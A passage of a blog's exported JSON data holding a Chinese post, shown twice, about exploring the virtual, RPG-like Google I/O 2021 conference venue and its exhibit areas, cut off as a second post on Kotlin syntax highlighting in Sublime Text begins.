title=\"无障碍展区\"></a>无障碍展区</h2><p>来到无障碍展区，也能发现不少小惊喜。看见右边那个戴紫色帽子的哥们儿了吗？靠近他会显示他的名字：<strong>DOM窃贼</strong>。他想偷右下角那个玻璃柜里的无障碍标志纪念品。</p>\n<p>这虚拟大会上竟然也有盗窃犯，有点真实……</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-20-59-image.png\"></p>\n<p>没想到这大半夜的，还能碰见其他活人，这种头顶有一串名字的，就是和我一样的线上参会者，他们一般也会四处蹦跶，很容易认出来。</p>\n<p>看见左下角那个<strong>宝箱</strong>了吗？被我打开了，里面也会有一些纪念品。刚开始没注意到，后来发现每个展区都有这种宝箱。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-26-10-image.png\"></p>\n<p>Google这些年在无障碍上面还是下了不少功夫，才赶上了苹果的用户体验，让残障人士也能独立使用科技产品。一开始在Android系统上发力，目前已经做得比较成熟了，国内的手机厂商也逐渐开始重视并适配，以致于不少开发者拿着Accessibility的API搞黑科技。</p>\n<p>最近一两年业内又开始完善Web应用的<strong>无障碍功能</strong>，相信以后各端的无障碍体验都能对残障人士越来越友好吧。各位开发者也不要嫌麻烦适配，这个和多语言、RTL类似，是产品走向人性化的必经之路。</p>\n<h2 id=\"ML-AI展区\"><a href=\"#ML-AI展区\" class=\"headerlink\" title=\"ML &#x2F; AI展区\"></a>ML &#x2F; AI展区</h2><p>机器学习与人工智能展区，TensorFlow框架相关的内容占了绝大部分，包括<strong>TensorFlow Lite、TensorFlow.js、TensorFlow Core</strong>等。中间区域是一个神经网络的模型，还算比较有代表性吧。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-58-40-image.png\"></p>\n<p>开宝箱得了个<strong>TF的法杖</strong>，看来搞机器学习果然是炼丹哦。继续往里面走，穿过整个展区来到室外，可以看见一片草地，这里有很多挂着乐器的树，碰撞它们也会有变幻彩蛋。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-02-04-44-image.png\"></p>\n<p>现在AI涉足的领域真的很多，在艺术方面的应用，比如生成音乐、作词作曲、乐器演奏等。当然，这种创造性的工作，还是人和机器相辅相成更妙，完全依赖任一方都不太合适。</p>\n<h2 id=\"Web展区\"><a href=\"#Web展区\" class=\"headerlink\" title=\"Web展区\"></a>Web展区</h2><p>Web展区主要是<strong>浏览器、前端开发、搜索</strong>相关的技术了。这个展区应该是最热闹的了，毕竟前端开发者是数量也比较大。正如这个<strong>Chrome</strong>标志牌一样非常令人瞩目。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-51-33-image.png\"></p>\n<p>展区中间有一个<strong>Lighthouse测试</strong>，可以分析网站的性能、<strong>SEO</strong>等等，嘿嘿，试了一下<strong>少数派</strong>的域名，得分还可以，就是SEO这项有点低。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-34-50-image.png\"></p>\n<p>这里还发现一份SEO入门指南，打开后还特意提示“很长”，真是贴心哦，太长不看。前端的花样真的多，这个展区还介绍了很多我没听说过的API和开发框架。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-44-11-image.png\"></p>\n<p>展区最右边出现了熟悉的Chrome小游戏恐龙，我看它一直在这蹦跶，像是被关在这出不去了。Google说好的不作恶呢？连恐龙都敢囚禁。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-48-58-image.png\"></p>\n<h2 id=\"Material-Design展区\"><a href=\"#Material-Design展区\" class=\"headerlink\" title=\"Material Design展区\"></a>Material Design展区</h2><p>MD是Google官方的设计语言。让我意外的是，MD展区的参会人还挺多的，遇见好几个蹦来蹦去的（还有妹子角色）。看来设计师们也对IO大会很感兴趣哦！</p>\n<p>这里发现一个小彩蛋，中间有个<strong>大花坛</strong>，周围有4个圆凳一样的东西，碰它们，中间的花朵会发生变幻。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-10-57-image.png\"></p>\n<p>如今Material Design也可以用于<strong>WordPress</strong>，感觉有很多年没玩过这个博客框架了。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-18-00-image.png\"></p>\n<h2 id=\"其他小细节\"><a href=\"#其他小细节\" class=\"headerlink\" title=\"其他小细节\"></a>其他小细节</h2><p>上面逛的基本上也是我感兴趣的几个，还有好多其他展区就不带大家走马观花咯！其实每个展区的内容都非常棒，Google以最生动的形式给大家科普了他们家前沿的IT技术，仔细探索会发现很多有趣的彩蛋。</p>\n<p>我目前体验到的比较明显的：</p>\n<ul>\n<li>Android展区的北边，相当于整个乐园的中心，有高尔夫球场。这有个哥们儿在乐此不彼地打高尔夫。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-02-07-43-image.png\"></p>\n<ul>\n<li>除了通过方向键和地图快捷传送来移动角色以外，按Tab键还会有Waypoints，连续按可以切换不同的提示，以便在展区内快速移动到不同的展台。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-56-11-image.png\"></p>\n<ul>\n<li><p>每个展区最中间区域大概都是BGM的音源位置，声音最大，如果走到边缘区域，声音就会变小，即立体音效。</p>\n</li>\n<li><p>撞到墙的话，会有音效，听起来很像撞到了纸板或木板的声音，完全模拟了线下这种展会所用的临时墙体材料。</p>\n</li>\n<li><p>路边的小铺基本都是可以交互的，比如这个卖茶的，饿了可以吃吃喝喝。</p>\n</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-02-15-23-image.png\"></p>\n<ul>\n<li>某些展区的电视旁边的招牌只显示一个汉字，这个可能是个翻译或者显示的Bug。比如下面这个，英文显示的是Mobile。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-58-46-image.png\"></p>\n<ul>\n<li>网页太久失去焦点，角色会睡着，看下面这个家伙就睡着挂机了。挂机太久会踢你下线，再回来需要重新连接。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-49-08-image.png\"></p>\n<p>乐园实在太大，更多的彩蛋细节，还是大家慢慢去发掘了。上面不少有趣的地方都在地图的体验区当中。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-13-38-12-image.png\"></p>\n<p>最后整理一下每个展区的具体内容吧：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Android</td>\n<td>Android 12、Wear、Cars、TV、Google Play、MAD、Jetpack Compose</td>\n</tr>\n<tr>\n<td>Accessibility</td>\n<td>Inspire（启迪区）、Empower（赋能区，包括Web支持等）</td>\n</tr>\n<tr>\n<td>ARCore</td>\n<td>Recording &amp; Playback API、Cloud Anchors API、Depth API</td>\n</tr>\n<tr>\n<td>Flutter</td>\n<td>使用入门、With Google、Dart、跨平台</td>\n</tr>\n<tr>\n<td>Firebase</td>\n<td>演示区、CodeLab</td>\n</tr>\n<tr>\n<td>Google Maps Platform</td>\n<td>使用入门、Mobile、Web</td>\n</tr>\n<tr>\n<td>Google Assistant</td>\n<td>Etsy、eBay、Twitter、Strava</td>\n</tr>\n<tr>\n<td>Google Cloud</td>\n<td>Cloud、工作区和AppSheet、数据与AI、App Dev Booth</td>\n</tr>\n<tr>\n<td>Google Pay</td>\n<td>工具和库、安全、Pay的新增功能、Android</td>\n</tr>\n<tr>\n<td>Material Design</td>\n<td>Design、Web、Android</td>\n</tr>\n<tr>\n<td>ML &#x2F; AI</td>\n<td>Cloud AI、TF Lite、TF Core、TF.js</td>\n</tr>\n<tr>\n<td>Web</td>\n<td>Fugu、Angular、Core Web Vitals、PWA、搜索、性能、DevTools、安全、隐私与验证</td>\n</tr>\n</tbody></table>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>此文为初稿备份，终稿已发布于少数派：<a href=\"https://sspai.com/post/66830\">https://sspai.com/post/66830</a></p>\n<hr>\n<p>2021年的 <a href=\"https://events.google.com/io/about/?lng=zh-CN\">Google I&#x2F;O大会</a> 已经圆满闭幕，我们从下面几条官方的FAQ可以看出今年大会与往届有所不同：</p>\n<ul>\n<li><p>2021年Google I&#x2F;O大会主要面向哪些人群？</p>\n<p>全球范围内对Google技术感兴趣的开发者都应关注此次大会，以便了解最新的产品发布、Google专家的行业洞见，并进行实践性学习。</p>\n</li>\n<li><p>Google I&#x2F;O 2021大会的举办时间和地点？</p>\n<p>2021年开发者大会将于5月18日至20日以<strong>虚拟形式</strong>举办。</p>\n</li>\n<li><p>Google I&#x2F;O 2021大会的费用是多少？</p>\n<p>本届Google I&#x2F;O大会对所有人免费，包括会上那些需要预约的内容，我们希望人人都能参与其中并从中获益。</p>\n</li>\n</ul>\n<p>我觉得最有意思的就是这个线上虚拟大会，这基本上就是一个完整的在线RPG游戏。我相信这也是全世界大多数开发者人生中第一次“亲临”IO大会现场。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-13-46-41-image.png\"></p>\n<p>接下来我就带大家一起逛逛这次有趣的大会吧。</p>\n<h2 id=\"初入乐园\"><a href=\"#初入乐园\" class=\"headerlink\" title=\"初入乐园\"></a>初入乐园</h2><p>刚进入加载页面的时候，我们就能看见背景是整个大会的像素风地图全貌，可以看见内容还是蛮多的，有Android展区、Web展区、AI展区、Flutter展区、无障碍（Accessibility）展区等等。这真的好像一个游乐园啊，姑且请我称之为“<strong>乐园</strong>”，哈哈哈！</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-13-53-24-image.png\"></p>\n<p>在加载过程中，会有排队等待、下载地图资源等提示，和游戏服务器一样的，进入之后会看见自己所处的线路。</p>\n<p>首次进入乐园需要定制自己角色的外观，包括左右手的<strong>装饰、头饰、肤色、体型、发型</strong>等，选项真的还不少呢，方脑袋、圆脑壳、瓜子脸应有尽有……从选项也可见大会的包容性还是很强的，不管你是四肢健全还是残障人士，都有选择（无障碍也是本次大会的一个主题之一）。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-15-07-48-image.png\"></p>\n<p>你可以扮演一个喝饮料的小朋友，可以扮演一个摄影爱好者，可以扮演一个做笔记的记者，也可以扮演一个到处搜集大会宣传资料的收藏家，这都取决于你的定制。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-15-12-56-image.png\"></p>\n<p>我能想象到的发色，这里面基本都有了。你甚至可以头上整点儿绿（无意间发现帽子和头发的选择居然有29项之多，实在是细），当然我还是选个中规中矩的黑色吧！</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-15-11-44-image.png\"></p>\n<p>定制好角色之后，我第一件感兴趣的事情，就是看看这整个乐园是不是<strong>无缝地图</strong>，这大概是我的RPG游戏后遗症。操作角色的方法很简单，就是方向键控制移动。然后当我从一个展区（官方称之为“产品圆顶屋”）移动到另一个展区时，发现地图是需要重新加载的，看来并不是无缝的。</p>\n<p>不过，这也说明乐园整体是很大的，考虑到<strong>性能问题</strong>，不方便一次性加载。所以应该会有很多<strong>彩蛋</strong>等我们发掘。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-13-55-51-image.png\"></p>\n<p>罗列了一下地图中所有的产品圆顶屋（名称按字典排序）：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>方位</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Android</td>\n<td>南</td>\n</tr>\n<tr>\n<td>Accessibility</td>\n<td>东南</td>\n</tr>\n<tr>\n<td>ARCore</td>\n<td>西南</td>\n</tr>\n<tr>\n<td>Flutter</td>\n<td>西南</td>\n</tr>\n<tr>\n<td>Firebase</td>\n<td>东北</td>\n</tr>\n<tr>\n<td>Google Maps Platform</td>\n<td>西南</td>\n</tr>\n<tr>\n<td>Google Assistant</td>\n<td>北</td>\n</tr>\n<tr>\n<td>Google Cloud</td>\n<td>东北</td>\n</tr>\n<tr>\n<td>Google Pay</td>\n<td>东北</td>\n</tr>\n<tr>\n<td>Material Design</td>\n<td>东南</td>\n</tr>\n<tr>\n<td>ML &#x2F; AI</td>\n<td>西</td>\n</tr>\n<tr>\n<td>Web</td>\n<td>东</td>\n</tr>\n</tbody></table>\n<p>OK，我们现在正式开始探索几个主要的展区。在逛第一个展区之前，我们先了解下乐园的UI。</p>\n<p>点击左上角的小地图，右边栏就会展开各区的快捷传送菜单，懒人必备哦！到达目的地之后，屏幕中央会显示操作提示，这个时候需要点一下以便选中角色（有高亮描边），然后才能用方向键控制。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-16-51-image.png\"></p>\n<p>这个界面总体来说比较简单，就像小时候玩的摩尔庄园一样。左上角小地图旁有一个背景音乐的开关，有趣的是，我用市面上的听歌识曲没有识别出来这悠扬的BGM是什么（大家有兴趣可以去挖掘一下）。左下角有个拍照按钮，拍完之后可以下载到本地。底部是动作表情栏，点击之后头顶会显示相应的表情，可与其他人进行简单的互动。</p>\n<p>可以看到，我目前没有聊天的权限，好久之前就注册过参会者了，然而还是没有效果，我估计是语言和地区的原因。</p>\n<p>最右边呢就是一些工具栏了，可以修改自己的装饰，查看自己的参会铭牌，日程表等等。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-42-00-image.png\"></p>\n<p>系统设置选项还不少，深色模式和离线模式比较人性化。后面也有八国语言的设置，还能退出或者删除当前角色。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-45-09-image.png\"></p>\n<p>与NPC，哦不，是与Google员工对话的方式就是<strong>靠近ta</strong>，会自动弹出对话框，查看展台的展品或者详情介绍也是靠近即可。发现一个小彩蛋，在随意触碰几个展品后，还<strong>解锁了成就</strong>，不知道凑齐了是个什么。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-50-32-image.png\"></p>\n<h2 id=\"Android展区\"><a href=\"#Android展区\" class=\"headerlink\" title=\"Android展区\"></a>Android展区</h2><p>逛了一圈Android展区下来，发现<strong>Android for Cars</strong>占了很大一块区域，或许这就是风口吧，以后落魄的Android开发可以去搞车载应用的开发了。现在大多数<strong>车机系统</strong>也都是基于Android的。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-57-38-image.png\"></p>\n<p>看，这儿还专门给宝马留了一块区域呢。车子的展台占了正中间的好地方。除此之外，周围分别有：<strong>Android 12、Wear OS、TV、Google Play、Jetpack</strong>展台，这些都是Android技术团队近年来大力推广的东西吧。</p>\n<p>瞧这边展台还能看见<strong>Kotlin</strong>语言的小模型，细节细节。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-08-12-image.png\"></p>\n<p>在Android 12展台的旁边，我还发现了一个有趣的玩意儿：<strong>I&#x2F;O照相亭</strong>，不知道是什么东西，点进去看看。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-10-03-image.png\"></p>\n<p>噢，原来是用Flutter开发的一个Web应用（会获取摄像头权限），类似于街边那种自拍证件照的小屋子。有点意思，地址在这里：<a href=\"https://photobooth.flutter.dev/#/\">I&#x2F;O Photo Booth</a></p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-11-36-image.png\"></p>\n<p>每个展台都有很多的<strong>文章、视频</strong>链接，NPC的<strong>对话内容</strong>也千奇百怪，可以说内容丰富程度不亚于线下大会。正当我准备离开Android展区时，触发了一个<strong>1000步</strong>数的成就，自动弹出了成就奖励，一个哑铃。好家伙，这是要我举着哑铃看展子吗？</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-56-14-image.png\"></p>\n<h2 id=\"无障碍展区\"><a href=\"#无障碍展区\" class=\"headerlink\" title=\"无障碍展区\"></a>无障碍展区</h2><p>来到无障碍展区，也能发现不少小惊喜。看见右边那个戴紫色帽子的哥们儿了吗？靠近他会显示他的名字：<strong>DOM窃贼</strong>。他想偷右下角那个玻璃柜里的无障碍标志纪念品。</p>\n<p>这虚拟大会上竟然也有盗窃犯，有点真实……</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-20-59-image.png\"></p>\n<p>没想到这大半夜的，还能碰见其他活人，这种头顶有一串名字的，就是和我一样的线上参会者，他们一般也会四处蹦跶，很容易认出来。</p>\n<p>看见左下角那个<strong>宝箱</strong>了吗？被我打开了，里面也会有一些纪念品。刚开始没注意到，后来发现每个展区都有这种宝箱。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-26-10-image.png\"></p>\n<p>Google这些年在无障碍上面还是下了不少功夫，才赶上了苹果的用户体验，让残障人士也能独立使用科技产品。一开始在Android系统上发力，目前已经做得比较成熟了，国内的手机厂商也逐渐开始重视并适配，以致于不少开发者拿着Accessibility的API搞黑科技。</p>\n<p>最近一两年业内又开始完善Web应用的<strong>无障碍功能</strong>，相信以后各端的无障碍体验都能对残障人士越来越友好吧。各位开发者也不要嫌麻烦适配，这个和多语言、RTL类似，是产品走向人性化的必经之路。</p>\n<h2 id=\"ML-AI展区\"><a href=\"#ML-AI展区\" class=\"headerlink\" title=\"ML &#x2F; AI展区\"></a>ML &#x2F; AI展区</h2><p>机器学习与人工智能展区，TensorFlow框架相关的内容占了绝大部分，包括<strong>TensorFlow Lite、TensorFlow.js、TensorFlow Core</strong>等。中间区域是一个神经网络的模型，还算比较有代表性吧。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-58-40-image.png\"></p>\n<p>开宝箱得了个<strong>TF的法杖</strong>，看来搞机器学习果然是炼丹哦。继续往里面走，穿过整个展区来到室外，可以看见一片草地，这里有很多挂着乐器的树，碰撞它们也会有变幻彩蛋。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-02-04-44-image.png\"></p>\n<p>现在AI涉足的领域真的很多，在艺术方面的应用，比如生成音乐、作词作曲、乐器演奏等。当然，这种创造性的工作，还是人和机器相辅相成更妙，完全依赖任一方都不太合适。</p>\n<h2 id=\"Web展区\"><a href=\"#Web展区\" class=\"headerlink\" title=\"Web展区\"></a>Web展区</h2><p>Web展区主要是<strong>浏览器、前端开发、搜索</strong>相关的技术了。这个展区应该是最热闹的了，毕竟前端开发者是数量也比较大。正如这个<strong>Chrome</strong>标志牌一样非常令人瞩目。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-51-33-image.png\"></p>\n<p>展区中间有一个<strong>Lighthouse测试</strong>，可以分析网站的性能、<strong>SEO</strong>等等，嘿嘿，试了一下<strong>少数派</strong>的域名，得分还可以，就是SEO这项有点低。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-34-50-image.png\"></p>\n<p>这里还发现一份SEO入门指南，打开后还特意提示“很长”，真是贴心哦，太长不看。前端的花样真的多，这个展区还介绍了很多我没听说过的API和开发框架。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-44-11-image.png\"></p>\n<p>展区最右边出现了熟悉的Chrome小游戏恐龙，我看它一直在这蹦跶，像是被关在这出不去了。Google说好的不作恶呢？连恐龙都敢囚禁。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-48-58-image.png\"></p>\n<h2 id=\"Material-Design展区\"><a href=\"#Material-Design展区\" class=\"headerlink\" title=\"Material Design展区\"></a>Material Design展区</h2><p>MD是Google官方的设计语言。让我意外的是，MD展区的参会人还挺多的，遇见好几个蹦来蹦去的（还有妹子角色）。看来设计师们也对IO大会很感兴趣哦！</p>\n<p>这里发现一个小彩蛋，中间有个<strong>大花坛</strong>，周围有4个圆凳一样的东西，碰它们，中间的花朵会发生变幻。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-10-57-image.png\"></p>\n<p>如今Material Design也可以用于<strong>WordPress</strong>，感觉有很多年没玩过这个博客框架了。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-01-18-00-image.png\"></p>\n<h2 id=\"其他小细节\"><a href=\"#其他小细节\" class=\"headerlink\" title=\"其他小细节\"></a>其他小细节</h2><p>上面逛的基本上也是我感兴趣的几个，还有好多其他展区就不带大家走马观花咯！其实每个展区的内容都非常棒，Google以最生动的形式给大家科普了他们家前沿的IT技术，仔细探索会发现很多有趣的彩蛋。</p>\n<p>我目前体验到的比较明显的：</p>\n<ul>\n<li>Android展区的北边，相当于整个乐园的中心，有高尔夫球场。这有个哥们儿在乐此不彼地打高尔夫。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-02-07-43-image.png\"></p>\n<ul>\n<li>除了通过方向键和地图快捷传送来移动角色以外，按Tab键还会有Waypoints，连续按可以切换不同的提示，以便在展区内快速移动到不同的展台。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-56-11-image.png\"></p>\n<ul>\n<li><p>每个展区最中间区域大概都是BGM的音源位置，声音最大，如果走到边缘区域，声音就会变小，即立体音效。</p>\n</li>\n<li><p>撞到墙的话，会有音效，听起来很像撞到了纸板或木板的声音，完全模拟了线下这种展会所用的临时墙体材料。</p>\n</li>\n<li><p>路边的小铺基本都是可以交互的，比如这个卖茶的，饿了可以吃吃喝喝。</p>\n</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-02-15-23-image.png\"></p>\n<ul>\n<li>某些展区的电视旁边的招牌只显示一个汉字，这个可能是个翻译或者显示的Bug。比如下面这个，英文显示的是Mobile。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-58-46-image.png\"></p>\n<ul>\n<li>网页太久失去焦点，角色会睡着，看下面这个家伙就睡着挂机了。挂机太久会踢你下线，再回来需要重新连接。</li>\n</ul>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-49-08-image.png\"></p>\n<p>乐园实在太大，更多的彩蛋细节，还是大家慢慢去发掘了。上面不少有趣的地方都在地图的体验区当中。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-13-38-12-image.png\"></p>\n<p>最后整理一下每个展区的具体内容吧：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Android</td>\n<td>Android 12、Wear、Cars、TV、Google Play、MAD、Jetpack Compose</td>\n</tr>\n<tr>\n<td>Accessibility</td>\n<td>Inspire（启迪区）、Empower（赋能区，包括Web支持等）</td>\n</tr>\n<tr>\n<td>ARCore</td>\n<td>Recording &amp; Playback API、Cloud Anchors API、Depth API</td>\n</tr>\n<tr>\n<td>Flutter</td>\n<td>使用入门、With Google、Dart、跨平台</td>\n</tr>\n<tr>\n<td>Firebase</td>\n<td>演示区、CodeLab</td>\n</tr>\n<tr>\n<td>Google Maps Platform</td>\n<td>使用入门、Mobile、Web</td>\n</tr>\n<tr>\n<td>Google Assistant</td>\n<td>Etsy、eBay、Twitter、Strava</td>\n</tr>\n<tr>\n<td>Google Cloud</td>\n<td>Cloud、工作区和AppSheet、数据与AI、App Dev Booth</td>\n</tr>\n<tr>\n<td>Google Pay</td>\n<td>工具和库、安全、Pay的新增功能、Android</td>\n</tr>\n<tr>\n<td>Material Design</td>\n<td>Design、Web、Android</td>\n</tr>\n<tr>\n<td>ML &#x2F; AI</td>\n<td>Cloud AI、TF Lite、TF Core、TF.js</td>\n</tr>\n<tr>\n<td>Web</td>\n<td>Fugu、Angular、Core Web Vitals、PWA、搜索、性能、DevTools、安全、隐私与验证</td>\n</tr>\n</tbody></table>\n"},{"layout":"post","title":"快速实现Sublime Text的Kotlin高亮","subtitle":"又闲下来了。","date":"2021-06-17T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n\nSublime Text是一款非常实用的编辑器软件，偶尔不想开大型IDE的时候，用它来看看代码还是不错的。\n\n不过发现在用它来查看Kotlin代码时，默认是一片白，没有语言对应的高亮，点击右下角选择语言时也没有Kotlin这个选项（下图是解决问题之后的）。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210619185555397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n### 解决\n\n没有高亮看着多不舒服啊，如何快速搞定呢？已经有开源项目帮我们解决了。\n\n#### 